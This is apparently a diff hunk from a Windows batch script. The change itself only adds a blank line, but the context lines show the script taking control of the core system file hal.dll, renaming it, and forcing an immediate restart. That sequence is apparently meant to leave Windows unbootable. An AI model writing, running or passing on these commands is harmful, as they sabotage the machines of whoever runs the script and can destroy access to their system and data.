@@ -37,6 +37,7 @@ icacls hal.dll /grant %USERNAME%:(d,wdac)
 ren hal.dll hal1.dll
 Shutdown /r /t 00
 exit
+
 :Close
 endlocal
 exit
